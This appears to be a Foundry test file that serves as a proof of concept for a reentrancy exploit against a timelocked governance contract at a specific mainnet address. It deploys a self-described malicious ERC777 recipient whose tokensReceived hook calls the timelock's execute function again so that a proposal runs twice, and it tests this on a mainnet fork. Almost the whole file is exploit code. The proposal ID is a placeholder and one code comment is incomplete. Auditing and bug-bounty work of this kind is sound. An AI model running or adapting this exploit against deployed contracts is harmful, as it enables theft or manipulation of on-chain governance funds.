// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {IERC777Recipient} from "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import {IERC1820Registry} from "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

interface ITimelockedGovernance {
    function execute(uint256 proposalId) external;
}

contract ReentrantReceiver is IERC777Recipient {
    ITimelockedGovernance public timelock;
    uint256 public proposalId;
    bool public hasReentered;

    constructor(address _timelock, uint256 _proposalId) {
        timelock = ITimelockedGovernance(_timelock);
        proposalId = _proposalId;
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        if (!hasReentered) {
            hasReentered = true;
            // Re-enter during execution before ` = true` is set
            timelock.execute(proposalId);
        }
    }
}

contract ReentrantExecutePoC is Test {
    address constant TIMELOCK_ADDR = 0xCE0425301C85c5Ea2A0873A2dEe44d78E02D2316;
    address constant ERC1820 = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
    ITimelockedGovernance timelock = ITimelockedGovernance(TIMELOCK_ADDR);

    ReentrantReceiver public receiver;

    function setUp() public {
        uint256 forkId = vm.createFork(vm.envString("MAINNET_RPC_URL"));
        vm.selectFork(forkId);
    }

    function test_ReentrancyExecute() public {
        uint256 proposalId = 1; // Replace with a real proposal that triggers token transfer to our receiver

        // Deploy our malicious contract
        receiver = new ReentrantReceiver(address(timelock), proposalId);

        // Register as ERC777 recipient
        IERC1820Registry(ERC1820).setInterfaceImplementer(
            address(receiver),
            keccak256("ERC777TokensRecipient"),
            address(receiver)
        );

        // Simulate malicious payload execution
        vm.prank(address(this)); // act as admin or executor
        timelock.execute(proposalId); // this will call tokensReceived → reenter → execute again

        // Assert reentrancy effect (e.g., proposal executed twice)
        assertTrue(receiver.hasReentered(), "Reentrancy did not occur");
    }
}
